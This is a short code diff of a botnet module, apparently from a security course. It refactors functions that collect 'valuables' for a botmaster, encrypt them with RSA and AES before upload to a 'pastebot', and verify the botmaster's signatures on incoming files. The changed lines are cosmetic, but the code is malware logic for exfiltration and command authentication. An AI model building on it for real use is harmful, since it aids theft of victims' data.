@@ -10,10 +10,8 @@ from lib.helpers import ANSI_X923_pad, ANSI_X923_unpad
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
-# Valuable data to be sent to the botmaster
-valuables = []
-# The length of the signature
-SIGN_LEN = 128 
+valuables = []  # Valuable data to be sent to the botmaster
+SIGN_LEN = 256  # The length of the signature
 
 def save_valuable(data):
   valuables.append(data)
@@ -30,8 +28,8 @@ def encrypt_for_master(data):
   ciphertext      = cipher.encrypt(data_to_encrypt)
   
   # Use the rsa key to encrypt the symmetric key
-  rsa_key       = RSA.importKey(open('pubKey.der', 'rb').read())
-  rsa_cipher    = PKCS1_OAEP.new(rsa_key)
+  pubkey       = RSA.importKey(open('pubkey.pem', 'rb').read())
+  rsa_cipher   = PKCS1_OAEP.new(pubkey)
   encrypted_key = rsa_cipher.encrypt(key)
   
   return iv + encrypted_key + ciphertext
@@ -52,9 +50,9 @@ def upload_valuables_to_pastebot(fn):
 def verify_file(f):
   # Verify the file was sent by the bot master
   signature = f[:SIGN_LEN]
-  key = RSA.importKey(open('pubKey.der', 'rb').read())
+  pubkey = RSA.importKey(open('pubkey.pem', 'rb').read())
   h = SHA256.new(f[SIGN_LEN:])
-  verifier = PKCS1_v1_5.new(key)
+  verifier = PKCS1_v1_5.new(pubkey)
   
   return verifier.verify(h, signature)
   
